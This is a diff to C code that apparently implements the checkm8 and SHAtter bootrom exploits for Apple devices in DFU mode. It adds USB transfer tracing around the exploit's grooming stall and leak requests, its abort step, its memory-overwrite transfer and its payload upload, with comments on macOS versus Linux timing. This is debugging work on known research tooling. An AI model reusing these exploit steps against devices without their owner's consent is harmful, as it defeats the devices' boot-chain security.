@@ -89,8 +89,21 @@ static void get_data(irecv_client_t client, char* buffer, unsigned long length) 
     printf("get_data: %i\n", error);
 }
 
+// Defined further down with the tracing machinery; declared here because the
+// helpers below are the exploit's earliest transfers and are worth tracing too.
+static int tracedTransferEx(irecv_client_t client, const char* label,
+                            uint8_t bmRequestType, uint8_t bRequest,
+                            uint16_t wValue, uint16_t wIndex,
+                            unsigned char* data, uint16_t wLength,
+                            unsigned int timeout, int* transferred);
+static int tracedTransfer(irecv_client_t client, const char* label,
+                          uint8_t bmRequestType, uint8_t bRequest,
+                          uint16_t wValue, uint16_t wIndex,
+                          unsigned char* data, uint16_t wLength,
+                          unsigned int timeout);
+
 static void request_image_validation(irecv_client_t client) {
-    int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 1000);
+    int ret = tracedTransfer(client, "image-validation", 0x21, 1, 0, 0, NULL, 0, 1000);
     if (ret != 0) {
         printf("Failed to request image validation\n");
     }
@@ -98,9 +111,9 @@ static void request_image_validation(irecv_client_t client) {
     unsigned char blank[16];
     memset(blank, 0, 16);
 
-    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
-    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
-    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 1000);
+    tracedTransfer(client, "image-validation/status1", 0xA1, 3, 0, 0, blank, 6, 1000);
+    tracedTransfer(client, "image-validation/status2", 0xA1, 3, 0, 0, blank, 6, 1000);
+    tracedTransfer(client, "image-validation/status3", 0xA1, 3, 0, 0, blank, 6, 1000);
     usb_reset(client);
 }
 
@@ -124,17 +137,17 @@ static int msleep(long msec) {
 }
 
 static int usb_req_stall(irecv_client_t client) {
-    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
+    return tracedTransfer(client, "groom/stall", 0x2, 3, 0x0, 0x80, NULL, 0, 10);
 }
 
 static int usb_req_leak(irecv_client_t client) {
     unsigned char buf[0x40];
-    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
+    return tracedTransfer(client, "groom/leak", 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
 }
 
 static int usb_req_no_leak(irecv_client_t client) {
     unsigned char buf[0x41];
-    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
+    return tracedTransfer(client, "groom/no-leak", 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
 }
 
 // checkm8 deliberately induces a pipe stall as its first exploit step, and
@@ -172,6 +185,150 @@ static int isPipeStall(int ret) {
 
 static int isTransferTimeout(int ret) {
     return ret == IRECV_E_TIMEOUT || ret == LIBUSB_RET_TIMEOUT;
+}
+
+// ---------------------------------------------------------------------------
+// Transfer tracing (DEBUG_TRACE_TRANSFERS)
+// ---------------------------------------------------------------------------
+//
+// A poor man's usbmon, and the reason it exists: the decisive open question
+// in this investigation is what the overwrite transfer does on a run that
+// WORKS, which means a macOS run, and macOS will not give up the wire. Its
+// USB capture interfaces (XHC20 and friends) do not even appear in ifconfig
+// unless SIP is fully disabled -- confirmed from Apple DTS, not inferred --
+// and reports say the method fails on 15.6.1+ with SIP already off. So the
+// measurement has to come from inside this process instead, in a form that
+// diffs cleanly against a Linux run of the same binary.
+//
+// What this records, per control transfer: the request itself, the return
+// value, how many bytes the host controller believes moved (via
+// irecv_usb_control_transfer_ex() -- neither backend's ordinary wrapper
+// keeps that count on a stall or timeout), and elapsed wall time in
+// microseconds.
+//
+// Elapsed time is not filler. docs/HISTORY.md's claim that ordinary control
+// transfers here complete in 27-820us, and therefore that the 100us cancel
+// delay sits below the floor for getting a data stage moving, is derived
+// entirely from Linux. Whether that floor is the same on the platform where
+// the exploit actually succeeds has never been measured.
+//
+// NOTHING IS PRINTED WHILE THE EXPLOIT RUNS. Records go into a fixed array
+// and are flushed at the end. This is exploit-critical hardware-timing code
+// (see AGENTS.md); a printf() between the bug setup and the overwrite would
+// put a write() syscall, and possibly a blocking terminal, inside the exact
+// window this is trying to measure. The array is fixed-size and silently
+// stops recording when full for the same reason -- no malloc() on the path.
+//
+// Off unless DEBUG_TRACE_TRANSFERS is set, like every other DEBUG_ knob
+// here: an unset environment has to remain the original path byte for byte.
+
+#define kMaxTraceRecords 256
+
+typedef struct {
+    const char* label;
+    uint8_t bmRequestType;
+    uint8_t bRequest;
+    uint16_t wValue;
+    uint16_t wIndex;
+    uint16_t wLength;
+    int ret;
+    int transferred;
+    unsigned long elapsedUs;
+} trace_record_t;
+
+static trace_record_t traceRecords[kMaxTraceRecords];
+static size_t traceCount;
+static size_t traceDropped;
+
+static int tracingEnabled(void) {
+    static int resolved = 0;
+    static int value = 0;
+
+    if (!resolved) {
+        value = getenv("DEBUG_TRACE_TRANSFERS") != NULL;
+        resolved = 1;
+    }
+    return value;
+}
+
+static unsigned long nowUs(void) {
+    struct timespec ts;
+    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
+    return (unsigned long)ts.tv_sec * 1000000UL + (unsigned long)(ts.tv_nsec / 1000);
+}
+
+// Drop-in for irecv_usb_control_transfer() that records the call. `label`
+// names the exploit step, so a diff between two platforms lines up by stage
+// rather than by index. Always goes through irecv_usb_control_transfer_ex():
+// its return value is identical on both backends, and the partial count is
+// worth having on the untraced path too.
+static int tracedTransferEx(irecv_client_t client, const char* label,
+                            uint8_t bmRequestType, uint8_t bRequest,
+                            uint16_t wValue, uint16_t wIndex,
+                            unsigned char* data, uint16_t wLength,
+                            unsigned int timeout, int* transferred) {
+    int moved = 0;
+    unsigned long started = tracingEnabled() ? nowUs() : 0;
+
+    int ret = irecv_usb_control_transfer_ex(client, bmRequestType, bRequest, wValue,
+                                            wIndex, data, wLength, timeout, &moved);
+
+    if (tracingEnabled()) {
+        unsigned long elapsed = nowUs() - started;
+        if (traceCount < kMaxTraceRecords) {
+            trace_record_t* r = &traceRecords[traceCount++];
+            r->label = label;
+            r->bmRequestType = bmRequestType;
+            r->bRequest = bRequest;
+            r->wValue = wValue;
+            r->wIndex = wIndex;
+            r->wLength = wLength;
+            r->ret = ret;
+            r->transferred = moved;
+            r->elapsedUs = elapsed;
+        } else {
+            traceDropped++;
+        }
+    }
+    if (transferred) *transferred = moved;
+    return ret;
+}
+
+static int tracedTransfer(irecv_client_t client, const char* label,
+                          uint8_t bmRequestType, uint8_t bRequest,
+                          uint16_t wValue, uint16_t wIndex,
+                          unsigned char* data, uint16_t wLength,
+                          unsigned int timeout) {
+    return tracedTransferEx(client, label, bmRequestType, bRequest, wValue, wIndex,
+                            data, wLength, timeout, NULL);
+}
+
+// Called on every exit path out of runCheckm8()/runSHAtter(), including the
+// failing ones -- a failed run is the interesting one here.
+static void traceFlush(void) {
+    if (!tracingEnabled() || traceCount == 0) return;
+
+    printf("\n--- transfer trace (%zu records%s) ---\n", traceCount,
+           traceDropped ? ", TRUNCATED" : "");
+    printf("%-26s %4s %4s %6s %6s %6s %8s %6s %10s\n",
+           "stage", "type", "req", "value", "index", "len", "ret", "moved", "elapsed_us");
+    for (size_t i = 0; i < traceCount; i++) {
+        const trace_record_t* r = &traceRecords[i];
+        printf("%-26s 0x%02x 0x%02x 0x%04x 0x%04x %6u %8d %6d %10lu%s\n",
+               r->label, r->bmRequestType, r->bRequest, r->wValue, r->wIndex,
+               (unsigned)r->wLength, r->ret, r->transferred, r->elapsedUs,
+               isPipeStall(r->ret) ? "  (stall)"
+                                   : (isTransferTimeout(r->ret) ? "  (timeout)" : ""));
+    }
+    if (traceDropped) {
+        printf("(%zu further transfers not recorded -- kMaxTraceRecords exceeded)\n",
+               traceDropped);
+    }
+    printf("--- end transfer trace ---\n");
+    fflush(stdout);
+
+    traceCount = 0;
+    traceDropped = 0;
 }
 
 // How long the bug-setup DFU_DNLOAD is left running before it gets aborted.
@@ -389,7 +546,7 @@ static irecv_client_t get_tv(uint64_t ecid) {
     return NULL;
 }
 
-int runSHAtter(uint64_t ecid) {
+static int runSHAtterInner(uint64_t ecid) {
     irecv_client_t client = get_tv(ecid);
     if (!client) {
         fprintf(stderr, "SHAtter: no DFU-mode device found.\n");
@@ -477,7 +634,7 @@ int runSHAtter(uint64_t ecid) {
     return 1;
 }
 
-int runCheckm8(uint64_t ecid) {
+static int runCheckm8Inner(uint64_t ecid) {
     irecv_client_t client = get_tv(ecid);
     if (!client) {
         fprintf(stderr, "checkm8: no DFU-mode device found.\n");
@@ -617,7 +774,7 @@ int runCheckm8(uint64_t ecid) {
         return 0;
     }
 
-    ret = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
+    ret = tracedTransfer(client, "bug-setup/abort", 0x21, 4, 0, 0, NULL, 0, 0);
     if (ret != 0) {
         printf("Failed to send abort.\n");
         free(config.payload);
@@ -672,23 +829,37 @@ int runCheckm8(uint64_t ecid) {
     memcpy(overwrite_buf + config.overwrite_offset, config.overwrite, config.overwrite_len);
 
     unsigned overwriteTimeout = overwriteTimeoutMs();
-    int overwriteRet = irecv_usb_control_transfer(client, 0, 0, 0, 0, overwrite_buf,
-                                                   (uint16_t)overwrite_buf_len, overwriteTimeout);
-    // A negative return here is the transfer's error code, not a byte count --
-    // libusb reports a timeout as LIBUSB_ERROR_TIMEOUT regardless of how much
-    // actually went out, so how far this got is only visible on the wire (see
-    // scripts/analyze_usbmon_checkm8.py). Reported anyway to distinguish the
-    // two states a usbmon capture showed this transfer taking: stalled
-    // outright having moved nothing, versus accepted and absorbing data.
-    printf("overwrite: %zu bytes offered with a %u ms timeout -> ret %d%s\n",
-           overwrite_buf_len, overwriteTimeout, overwriteRet,
+    int overwriteMoved = 0;
+    int overwriteRet = tracedTransferEx(client, "OVERWRITE", 0, 0, 0, 0, overwrite_buf,
+                                        (uint16_t)overwrite_buf_len, overwriteTimeout,
+                                        &overwriteMoved);
+    // THE number this whole investigation turns on: does the device take all
+    // 1660 bytes, or none of them?
+    //
+    // A negative return here is the transfer's error code, not a byte count,
+    // and neither backend's ordinary wrapper keeps the partial count on a
+    // stall or timeout -- which is why this used to say "how far this got is
+    // only visible on the wire" and point at a usbmon capture. That is no
+    // longer true: irecv_usb_control_transfer_ex() (this project's
+    // libirecovery fork) preserves IOKit's req.wLenDone and libusb's
+    // transfer->actual_length, so the count is available on BOTH platforms
+    // and can be diffed directly. It had to become available, because macOS
+    // will not hand over the wire at all -- see docs/HISTORY.md on XHC20.
+    //
+    // Read `moved` with the caveat it deserves: on a timeout it is what the
+    // HOST controller believes it sent, which is not automatically what the
+    // device accepted. Where a Linux usbmon capture disagrees with it, the
+    // capture wins.
+    printf("overwrite: %zu bytes offered with a %u ms timeout -> ret %d, host moved %d%s\n",
+           overwrite_buf_len, overwriteTimeout, overwriteRet, overwriteMoved,
            isPipeStall(overwriteRet) ? " (stalled -- device rejected it outright)"
                                      : (isTransferTimeout(overwriteRet) ? " (timed out mid-transfer)" : ""));
     free(overwrite_buf);
 
     puts("Uploading payload");
 
-    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, (uint16_t)config.payload_len, 100);
+    ret = tracedTransfer(client, "payload-upload", 0x21, 1, 0, 0, config.payload,
+                         (uint16_t)config.payload_len, 100);
     if (!isTransferTimeout(ret)) {
         printf("Failed to upload payload.\n");
         free(config.payload);
@@ -723,4 +894,21 @@ int runCheckm8(uint64_t ecid) {
 
     puts("Checkm8 successful");
     return 1;
+}
+
+// Public entry points. The exploit bodies above are wrapped rather than
+// having traceFlush() bolted onto each of their ~20 return statements:
+// every one of those is an exit path worth a trace, and the failing ones
+// are the interesting ones, so missing even one would silently lose the
+// run that mattered.
+int runSHAtter(uint64_t ecid) {
+    int ret = runSHAtterInner(ecid);
+    traceFlush();
+    return ret;
+}
+
+int runCheckm8(uint64_t ecid) {
+    int ret = runCheckm8Inner(ecid);
+    traceFlush();
+    return ret;
 }
